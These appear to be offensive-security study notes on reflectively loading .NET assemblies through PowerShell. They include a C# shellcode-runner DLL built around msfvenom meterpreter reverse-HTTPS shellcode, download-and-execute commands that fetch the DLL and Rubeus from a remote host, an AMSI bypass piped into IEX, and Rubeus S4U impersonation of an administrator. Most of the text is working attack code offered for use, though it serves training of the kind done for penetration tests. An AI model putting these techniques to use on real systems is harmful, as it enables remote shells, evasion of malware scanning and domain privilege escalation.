First, we must create a malicious DLL from VisualStudio. To do so, we will create select the project type as "Class Library(.NET Framework)" obiously in C#. Here are the contents of the DLL:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Syste.Runtime.InteropServices;

namespace ClassLibrary1
{

  public class Class1
  {
      [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
      static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32.dll")]
      static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("kernel32.dll")]
      static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

      public static void Runner()
      {
        //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 enablestageencoding=true handlersslcert=justice.pem prependmigrate=true -f csharp
        byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8...

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
      }

  }

}
```
(note that we create the runner method with the prefixes public, static and void. Since the runner method must be available through reflection)

Then to invoke it through reflection with Powershell use the following commands:

```
PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/ClassLibrary1.dll')

PS C:\> $assem = [System.Reflection.Assembly]::Load($data)

PS C:\> $class = $assem.GetType("ClassLibrary1.Class1")

PS C:\> $method = $class.GetMethod("runner")

PS C:\> $method.Invoke(0, $null)
```

**EXAMPLE: Invoke Rubeus through refleciton:**

(We can do it because the Main method is public and we can call all the functions by specifying their names):

PowerShell commands:

```
PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt') | IEX  -> first bypass AMSI, amsi bypass used [here](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/AMSI%20Bypasses/PowerShell/AmsiContext.ps1)

PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')

PS C:\> $assem = [System.Reflection.Assembly]::Load($data)

PS C:\> [Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("purge".Split())
______ _
(_____ \ | |
_____) )_ _| |__ _____ _ _ ___
| __ /| | | | _ \| ___ | | | |/___)
| | \ \| |_| | |_) ) ____| |_| |___ |
|_| |_|____/|____/|_____)____/(___/
v1.5.0
[*] Action: Purge Tickets
Luid: 0x0
[+] Tickets successfully purged!

PS C:\> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:<ntlm_hash> /impersonateuser:administrator /msdsspn:<spn> /ptt".Split())  -> Example of calling Rubeus with arguments thourgh reflection
```

Alternatively we can use this script to reflecitvely load an x64 base64 PE(Portable Executable): https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs 
